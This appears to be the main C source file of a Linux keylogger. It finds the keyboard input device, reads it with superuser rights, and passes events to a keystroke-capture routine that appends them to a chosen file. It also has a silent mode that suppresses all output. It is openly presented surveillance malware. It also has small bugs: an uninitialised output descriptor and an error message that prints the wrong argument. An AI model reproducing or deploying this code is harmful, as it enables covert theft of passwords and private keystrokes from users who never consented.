#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylogger.h"
#include "find_event_file.h"




void print_usage_and_quit(char *application_name);

int main(int argc, char *argv[]){
    char *KEYBOARD_DEVICE = get_keyboard_event_file();
    if(!KEYBOARD_DEVICE){
        print_usage_and_quit(argv[0]);
    }

    int writeout;
    int keyboard;

    int file = 0, option = 0;
    char *option_input;
    // parsing and checking the command line arguments passed to this program
    while((option = getopt(argc, argv,"sn:f:")) != -1){
        switch(option){
            case 's':
                freopen("/dev/null", "w", stdout);
                freopen("/dev/null", "w", stderr);
                break;
            case 'f':
                // defining the filename to write the keystrokes to
                file = 1;
                option_input = optarg;
                break;
            default: print_usage_and_quit(argv[0]);
        }
    }
	if(file){
        // the user defined the filename to write the keystrokes to ... 
        // now it is time to write, append the keystrokes & if the file doesn't exist create it
        if((writeout = open(option_input, O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0){
            printf("Error opening file %s: %s\n", argv[2], strerror(errno));
            return 1;
        }
    }
    
    // when ever there is an error, the following line of code returns a value < 0
    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser. Execute using the sudo command\n", KEYBOARD_DEVICE);
        return 1;
    }
    // read all the events defined in keyboard and write them to a user specified file
   _keylogger(keyboard, writeout); 

    close(keyboard);
    close(writeout);
    free(KEYBOARD_DEVICE); // resource must be released by this process if not race conditions or starvation might occur
    return 0;
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-s] -f output-file]\n", application_name);
    exit(1);
}
